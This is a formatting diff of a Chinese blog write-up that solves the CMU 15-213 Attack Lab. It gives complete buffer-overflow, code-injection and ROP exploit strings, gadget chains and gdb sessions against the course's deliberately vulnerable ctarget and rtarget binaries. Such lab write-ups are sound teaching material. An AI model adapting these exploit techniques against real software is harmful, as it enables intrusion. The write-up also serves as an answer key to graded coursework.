@@ -11,6 +11,7 @@ tags:
   - "反编译"
   - "Exploit String Attack"
 ---
+
 # CMU15213-AttackLab
 
 ## AttackLab
@@ -21,6 +22,7 @@ tags:
 writeup中先看`ctarget`文件。
 
 在本地运行
+
 ```shell
 ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ ./ctarget -q
 Cookie: 0x59b997fa
@@ -33,7 +35,7 @@ FAIL: Would have posted the following:
         result  1:FAIL:0xffffffff:ctarget:0:
 ```
 
-error input1 // input sufficiently  short
+error input1 // input sufficiently short
 ![err1](https://s2.loli.net/2025/08/14/o7tH3iuDPR8Ufkr.png)
 
 error input2 // input too long
@@ -82,11 +84,13 @@ hex2raw：生成攻击字符串的实用程序。
 
 我们先尝试执行一遍ctarget
 向ctarget.l1.txt填入以下内容
+
 ```txt
 ef be ad de
 ```
 
 然后执行命令
+
 ```shell
 ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ ./hex2raw < ctarget.l1.txt | ./ctarget -q
 Cookie: 0x59b997fa
@@ -98,6 +102,7 @@ FAIL: Would have posted the following:
         lab     attacklab
         result  1:FAIL:0xffffffff:ctarget:0:
 ```
+
 肯定是失败的，然后gdb看一下test函数
 
 然后设计一下如何使用cgdb调试
@@ -110,10 +115,11 @@ FAIL: Would have posted the following:
 ```
 
 > 这里用到的`<()`会将输出变为一个临时文件
-> 
+>
 > 相当于下面这个方式创建的中间文件
 
 2. 通过中间文件
+
 ```shell
 ./hex2raw < ctarget.l1.txt > payload.raw
 (gdb) set args -q
@@ -122,7 +128,7 @@ FAIL: Would have posted the following:
 
 这里我们就采用第一种方式
 
-***这里遇到了两个小问题，通过gdb搞清楚了背后的原因，有一些小知识点，有关输入流和linux临时文件***，如果你没有遇到该问题，可以跳转[gdb解决了该问题后](#gdb解决了该问题后)
+**_这里遇到了两个小问题，通过gdb搞清楚了背后的原因，有一些小知识点，有关输入流和linux临时文件_**，如果你没有遇到该问题，可以跳转[gdb解决了该问题后](#gdb解决了该问题后)
 
 先不打断点运行看是否正常
 
@@ -155,6 +161,7 @@ FAIL: Would have posted the following:
 
 再尝试b test,然后运行，发现还是一样。
 我们看一下cgdb爆出一堆奇怪东西的bt
+
 ```shell
 (gdb) bt
 #0  0x00007ffff7dff0d0 in __vfprintf_internal (s=0x7ffff7fa5780 <_IO_2_1_stdout_>, format=0x4032b4 "Type string:",
@@ -164,6 +171,7 @@ FAIL: Would have posted the following:
 #3  launch (offset=<optimized out>) at support.c:293
 #4  0x0000000000401ffa in stable_launch (offset=<optimized out>) at support.c:340
 ```
+
 可见在stable_launch就挂在奇怪的地方了
 
 加两个断点`main`和`stable_launch`
@@ -205,6 +213,7 @@ FAIL: Would have posted the following:
 25│    0x0000000000401ef3 <+63>:    cmp    %rax,0x2025d6(%rip)        # 0x6044d0 <infile>
 26├──> 0x0000000000401efa <+70>:    jne    0x401f10 <launch+92>
 ```
+
 最终在infile launch+70行发现了the root fault，继续`si`结果如下。
 
 ```shell
@@ -231,6 +240,7 @@ Backtrace stopped: Cannot access memory at address 0x55686000
 对这里`display $eflag`可知，这个cmp判断相等，随后就导致了错误
 
 查询`ctarget.d`，可知执行过的launch函数如下
+
 ```shell
 0000000000401eb4 <launch>:
   401eb4:	55                   	push   %rbp
@@ -238,7 +248,7 @@ Backtrace stopped: Cannot access memory at address 0x55686000
   401eb8:	48 83 ec 10          	sub    $0x10,%rsp
   401ebc:	48 89 fa             	mov    %rdi,%rdx
   401ebf:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
-  401ec6:	00 00 
+  401ec6:	00 00
   401ec8:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   401ecc:	31 c0                	xor    %eax,%eax
   401ece:	48 8d 47 1e          	lea    0x1e(%rdi),%rax
@@ -254,6 +264,7 @@ Backtrace stopped: Cannot access memory at address 0x55686000
 ```
 
 考虑将gdb时的汇编丢给ai，问一下含义
+
 ```shell
 23│ support.c:
 24│    0x0000000000401eec <+56>:    mov    0x2025ad(%rip),%rax        # 0x6044a0 <stdin@@GLIBC_2.2.5>
@@ -272,9 +283,11 @@ p/x stdin
 ```
 
 随后，可以尝试通过查看我们问题的二次复现
+
 ```shell
 ./ctarget -q <(./hex2raw < ./ctarget.l1.txt)
 ```
+
 发现这个和gdb一致，也会存在问题
 
 ###### gdb解决了该问题后
@@ -304,6 +317,7 @@ p/x stdin
 然后我们直接查看touch1的地址即可
 
 三种方式
+
 ```shell
 (gdb) p touch1
 $17 = {void ()} 0x4017c0 <touch1>
@@ -312,6 +326,7 @@ Symbol "touch1" is a function at address 0x4017c0.
 ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ nm ./ctarget | grep touch1
 00000000004017c0 T touch1
 ```
+
 然后遵循字节序，赋值一下 ctarget.l1.txt
 
 ```shell
@@ -320,7 +335,7 @@ ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ nm ./ctarget 
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
-c0 17 40 00 00 00 00 00 
+c0 17 40 00 00 00 00 00
 ```
 
 这里有回车也没关系
@@ -345,21 +360,22 @@ PASS: Would have posted the following:
 > ![touch2](https://s2.loli.net/2025/08/17/sX8wJCQLAl53W9c.png)
 >
 > Your task is to get `CTARGET` to execute the code for `touch2` rather than returning to `test`. In this case, however, you must make it appear to `touch2` as if you have passed your cookie as its argument.
-> 
+>
 > Do not attempt to use `jmp` or `call` instructions in your exploit code. The encodings of destination addresses for these instructions are difficult to formulate. Use `ret` instructions for all transfers of control, even when you are not returning from a call.
 
 简单的用中文说，就是通过返回值调用touch2，同时传入参数——我们自己的cookie，限制使用jmp和call
 
-
 首先查询cookie的地址值，touch2的地址值
+
 ```shell
 (gdb) p/x &cookie
 $20 = 0x6044e4
-(gdb) p touch2 
+(gdb) p touch2
 $21 = {void (unsigned int)} 0x4017ec <touch2>
 ```
 
 然后尝试去编写注入代码
+
 ```assembly
 movq    $59b997fa, %rdi #或movq 0x6044e4 %rdi
 pushq   $0x4017ec
@@ -372,9 +388,11 @@ main:
         pushq	$0x4017ec
         ret
 ```
+
 然后编译并objdump
+
 ```shell
-ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ gcc -c injection.l2.s 
+ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ gcc -c injection.l2.s
 ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ objdump -d injection.l2.o
 
 injection.l2.o:     file format elf64-x86-64
@@ -385,8 +403,9 @@ Disassembly of section .text:
 0000000000000000 <main>:
    0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
    7:   68 ec 17 40 00          push   $0x4017ec
-   c:   c3                      ret    
+   c:   c3                      ret
 ```
+
 将dump出的机械码写入答案，也就是getbuf写入函数的顶部,然后40个字节处写下rsp在调用gets时的地址值即可。
 
 ```shell
@@ -404,8 +423,9 @@ Disassembly of section .text:
 ```
 
 即最终答案为
+
 ```txt
-48 c7 c7 fa 97 b9 59 68 
+48 c7 c7 fa 97 b9 59 68
 ec 17 40 00 c3 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
@@ -422,7 +442,7 @@ PASS: Would have posted the following:
         user id bovik
         course  15213-f15
         lab     attacklab
-        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
+        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
 ```
 
 ### Level 3
@@ -434,15 +454,17 @@ PASS: Would have posted the following:
 > Your task is to get `CTARGET` to execute the code for `touch3` rather than returning to test. You must make it appear to `touch3` as if you have passed a string representation of your cookie as its argument.
 
 避免去查ascii，这里有一个小技巧
+
 ```shell
 man ascii
 ```
 
-注意到hex_march这里有一个*s,随机在一个栈的位置取值，根据后面的写法，这里用sprintf完成了从unsigned到string的转变。并且重写了部分栈的区域。
+注意到hex_march这里有一个\*s,随机在一个栈的位置取值，根据后面的写法，这里用sprintf完成了从unsigned到string的转变。并且重写了部分栈的区域。
 
 利用test的栈就行，test有8个栈帧的空间，足够用了
 
 查询必要的信息
+
 ```shell
 
 ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ nm ./ctarget | grep touch3
@@ -463,6 +485,7 @@ ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ nm ./ctarget 
 这里通过两个rsp的值相减，可以发现相差的rsp值在test与getbuf之间足足有48个栈帧。可见地址实际上由于padding的原因是补齐了4个字节的。
 
 开始构造注入代码
+
 ```assembly
 main:
 	movq	0x5561dca8, %rdi
@@ -471,8 +494,9 @@ main:
 ```
 
 然后相同的指令
+
 ```shell
-ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ gcc -c injection.l3.s 
+ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ gcc -c injection.l3.s
 ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ objdump -d injection.l3.o
 
 injection.l3.o:     file format elf64-x86-64
@@ -483,7 +507,7 @@ Disassembly of section .text:
 0000000000000000 <main>:
    0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
    7:   68 fa 18 40 00          push   $0x4018fa
-   c:   c3                      ret  
+   c:   c3                      ret
 ```
 
 然后构造exploit string，注意这里的排序，是顺序排的，从低到高。`strcmp`会解决这个字符串没有结尾的问题
@@ -507,7 +531,7 @@ PASS: Would have posted the following:
         user id bovik
         course  15213-f15
         lab     attacklab
-        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 
+        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61
 ```
 
 基本上构造出来就对了
@@ -520,68 +544,69 @@ PASS: Would have posted the following:
 
 这种面向返回的攻击要比代码注入攻击要难的多，CMU介绍其主要具有两种技术点
 
-> -  It uses randomization so that the stack positions differ from one run to another. This makes it impossible to determine where your injected code will be located.
+> - It uses randomization so that the stack positions differ from one run to another. This makes it impossible to determine where your injected code will be located.
 > - It marks the section of memory holding the stack as nonexecutable, so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault
-> 
+>
 > 基本是说rtarget的代码采用了课程中提到的两种防范exploit string的方式。randomization的偏移，这使得注入代码不能被定位，此外，它标记了被栈持有的内存段无法被执行。
-> 
-> 
-![sequence of gatget](https://s2.loli.net/2025/08/18/IQMxRrSHa5Pv8om.png)
-> 
+>
+> ![sequence of gatget](https://s2.loli.net/2025/08/18/IQMxRrSHa5Pv8om.png)
+>
 > ~~为什么不用金丝雀，用了就很难攻击了~~
 
 通过提取function tailing的机器码构建gatget，在farm中包含了一些函数，这些函数的特殊tailing使得他们很适合这种攻击，从名字可以看出，这是tools' farm。
 
 可以尝试一下编译该文件
+
 ```shell
-ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ gcc -c farm.c 
+ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ gcc -c farm.c
 ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ objdump -d farm.o > farm.d
 ```
 
 随便看一个函数
+
 ```assembly
 00000000000001c8 <addval_187>:
- 1c8:	f3 0f 1e fa          	endbr64 
+ 1c8:	f3 0f 1e fa          	endbr64
  1cc:	55                   	push   %rbp
  1cd:	48 89 e5             	mov    %rsp,%rbp
  1d0:	89 7d fc             	mov    %edi,-0x4(%rbp)
  1d3:	8b 45 fc             	mov    -0x4(%rbp),%eax
  1d6:	2d 77 31 c7 3f       	sub    $0x3fc73177,%eax
  1db:	5d                   	pop    %rbp
- 1dc:	c3                   	ret    
+ 1dc:	c3                   	ret
 ```
+
 可见相对于下面的rtarget莫名其妙调用了很多东西
+
 ```assembly
 0000000000401a25 <addval_187>:
   401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
-  401a2b:	c3                   	ret    
+  401a2b:	c3                   	ret
 ```
 
 可见其中存在诸多例如调用rbp寄存器等无效操作，以及多出了一个endbr64等指令
 
-1. `endbr64`: 这是一个防范ROP Attack的指令
-        - 它被插入到每个函数的入口处
-        - CPU 在执行 ret 指令时，如果目标地址指向一条 endbr64 指令，才允许跳转
-        - 如果 ret 跳转到了没有 endbr64 的地方（比如中间的 gadget），CPU 会触发 #CP 异常（Control Protection Fault），终止程序
+1. `endbr64`: 这是一个防范ROP Attack的指令 - 它被插入到每个函数的入口处 - CPU 在执行 ret 指令时，如果目标地址指向一条 endbr64 指令，才允许跳转 - 如果 ret 跳转到了没有 endbr64 的地方（比如中间的 gadget），CPU 会触发 #CP 异常（Control Protection Fault），终止程序
 2. `-O2`: 普通的编译命令通常不采用优化，因此为了满足标准的汇编程序格式会有许多无效操作，例如上述代码中的rbp
 
 采用O2优化`-O2`以及禁用CET`-fcf-protection=none`后
+
 ```assembly
 0000000000000160 <addval_187>:
  164:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
- 16a:	c3                   	ret    
+ 16a:	c3                   	ret
  16b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
 ```
 
 ` 16b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)`:这一句只是5字节的填充模板，intel推荐的NOP模板
 
-| 填充字节 | 汇编                                       |
-|------|------------------------------------------|
-| 2    | 66 90→nopw %ax                           |
-| 3    | 0f 1f 00→nopl (%rax)                     |
-| 4    | 0f 1f 40 00→nopl 0x0(%rax)               |
-| 5    | 0f 1f 44 00 00→nopl 0x0(%rax,%rax,1)     |
-| 6    | 66 0f 1f 44 00 00→nopw 0x0(%rax,%rax,1)  |
+| 填充字节 | 汇编                                    |
+| -------- | --------------------------------------- |
+| 2        | 66 90→nopw %ax                          |
+| 3        | 0f 1f 00→nopl (%rax)                    |
+| 4        | 0f 1f 40 00→nopl 0x0(%rax)              |
+| 5        | 0f 1f 44 00 00→nopl 0x0(%rax,%rax,1)    |
+| 6        | 66 0f 1f 44 00 00→nopw 0x0(%rax,%rax,1) |
 
 这样看就和rtarget很近似了
 
@@ -589,12 +614,14 @@ ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ objdump -d fa
 
 重复Level 2的操作
 
-`TIPs`: 
+`TIPs`:
+
 1. 所有gadgets都可以在rtarget中找到，这块区域由start_farm和end_farm划分
 2. 秩序两个工具完成该攻击
 3. 漏洞利用代码应包含小工具地址和数据的组合
 
 recall一下Level 2的汇编
+
 ```assembly
 movq    $59b997fa, %rdi #或movq 0x6044e4 %rdi
 pushq   $0x4017ec
@@ -606,6 +633,7 @@ ret
 ![Appendix](https://s2.loli.net/2025/08/18/IZM3zdxjB9u64Hl.png)
 
 应该明确一些rules
+
 1. 所有数据都被存放在栈中
 2. 仅能通过返回值调用tailing代码
 
@@ -614,6 +642,7 @@ ret
 查询touch2地址为4017ec
 
 直接构造
+
 ```hex
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
@@ -628,6 +657,7 @@ ec 17 40 00 00 00 00 00
 理论上这是正确的，在调用touch2时rdi被赋值为正确的值。但是用到了并非tools `farm` 中的函数，实际运行发生了意料之外的`segment fault`
 
 尝试另一种解法，通过rax作为中间函数,通过`ROP`构造这样的gadget序列
+
 ```assembly
 pop %rax
 mov %rax %rdi
@@ -649,12 +679,14 @@ ec 17 40 00 00 00 00 00
 这个就对了，可以尝试比较这两个输入的执行流
 
 首先查看一下这个PASS的执行流，可见其在执行完cmp`coockie`和edi后jne顺利跳转到visible文件的段中
+
 ```assembly
 21│ visible.c:
 22│    0x0000000000401818 <+44>:    mov    $0x2,%edi
 23│    0x000000000040181d <+49>:    call   0x401dad <validate>
 24│    0x0000000000401822 <+54>:    jmp    0x401842 <touch2+86>
 ```
+
 该处执行到call后跳转至
 
 ```assembly
@@ -667,6 +699,7 @@ ec 17 40 00 00 00 00 00
 随后执行到exit结束
 
 然后看一下上面那个错误的执行流,则在比较完edi与rip后直接跳转到了系统库的stdio2.h中
+
 ```
 14│ /usr/include/x86_64-linux-gnu/bits/stdio2.h:
 15│ 105       return __fprintf_chk (__stream, __USE_FORTIFY_LEVEL - 1, __fmt,
@@ -675,9 +708,11 @@ ec 17 40 00 00 00 00 00
 18│    0x000000000040180e <+34>:    mov    $0x0,%eax
 19│    0x0000000000401813 <+39>:    call   0x400df0 <__printf_chk@plt>
 ```
+
 可见两者在比较完rip,edi中出现了不同，探索更多信息
 
 以下是正常PASS也就是通过rax传参的具体参数
+
 ```shell
 rax            0x59b997fa          1505335290
 rbx            0x7fffffffdce8      140737488346344
@@ -696,7 +731,7 @@ r13            0x0                 0
 r14            0x0                 0
 r15            0x7ffff7ffd040      140737354125376
 rip            0x401802            0x401802 <touch2+22>
---Type <RET> for more, q to quit, c to continue without paging-- 
+--Type <RET> for more, q to quit, c to continue without paging--
 
 (gdb) x/16gx $rsp
 0x7ffffffca330: 0x00000000004017ec      0xf4f4f4f4f4f4f400
@@ -748,18 +783,19 @@ rip            0x401802            0x401802 <touch2+22>
 可见rcx稳定的保持在214与190。考虑查看哪里修改了它
 
 查询到Gets函数中更改了rcx
+
 ```assembly
  ~│
  1│ Dump of assembler code for function getbuf:
  2│ buf.c:
  3│ 12      in buf.c
  4│    0x00000000004017a8 <+0>:     sub    $0x28,%rsp
- 5│    
+ 5│
  6│ 13      in buf.c
  7│ 14      in buf.c
  8│    0x00000000004017ac <+4>:     mov    %rsp,%rdi
  9├──> 0x00000000004017af <+7>:     call   0x401b60 <Gets>
-10│ 
+10│
 11│ 15      in buf.c
 12│ 16      in buf.c
 13│    0x00000000004017b4 <+12>:    mov    $0x1,%eax
@@ -774,20 +810,23 @@ rip            0x401802            0x401802 <touch2+22>
 
 > You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now.
 
-***HAHAHA!***,还要再战！简直就是提振精神的。
+**_HAHAHA!_**,还要再战！简直就是提振精神的。
 
 Level5 要求与Level3 相同，使用cookie字符串指针调用touch3
 
 `Tips`：
+
 1. 需要八个gadgets
 2. 用到movl
 
 review一下level3的代码
+
 ```assembly
 movq	$0x5561dca8, %rdi
 pushq	$0x4018fa
 ret
 ```
+
 这里可能已经忘记了0x5561dca8是什么，这是cookie存在栈中的地址，而0x4018fa是touch3的地址
 
 > `nm ./rtarget | grep`可以发现touch3的地址是一样的。
@@ -796,9 +835,8 @@ ret
 
 如果将其放置在栈中，我们将不知道cookie的地址。唯一相关的方式是获取rsp的地址值然后计算好偏移量。
 
-
-
 构造一下相关的汇编代码
+
 ```assembly
 movq %rsp %rax
 movq %rax %rdi
@@ -817,7 +855,7 @@ movq %rax, %rdi
         0x48 # 偏移地址
 4079cc: popq %rax # 取偏移地址
 4019dd: movl %eax %edx
-401a70: movl %edx %ecx 
+401a70: movl %edx %ecx
 401a13: movl %ecx %esi
 4019d6: lea  (%rdx,%rsi,1),%rax
 4019a2: movq %rax, %rdi
@@ -828,26 +866,27 @@ movq %rax, %rdi
 ![level5](https://s2.loli.net/2025/08/18/jQvp85anBgSET9R.png)
 
 构造
+
 ```shell
-00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00 
-ad 1a 40 00 00 00 00 00 
-a2 19 40 00 00 00 00 00 
-cc 19 40 00 00 00 00 00 
-48 00 00 00 00 00 00 00 
-dd 19 40 00 00 00 00 00 
-70 1a 40 00 00 00 00 00 
-13 1a 40 00 00 00 00 00 
-d6 19 40 00 00 00 00 00 
-a2 19 40 00 00 00 00 00 
-fa 18 40 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ad 1a 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+cc 19 40 00 00 00 00 00
+48 00 00 00 00 00 00 00
+dd 19 40 00 00 00 00 00
+70 1a 40 00 00 00 00 00
+13 1a 40 00 00 00 00 00
+d6 19 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+fa 18 40 00 00 00 00 00
 35 39 62 39 39 37 66 61
 ```
 
-***最终***
+**_最终_**
 
 ```shell
 ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ ./rtarget -q -i <(./hex2raw < rtarget.l5.txt)
@@ -864,5 +903,6 @@ PASS: Would have posted the following:
 ALL OVER
 
 ## REF
+
 1. https://csapp.cs.cmu.edu/3e/attacklab.pdf
 2. https://zhuanlan.zhihu.com/p/476396465
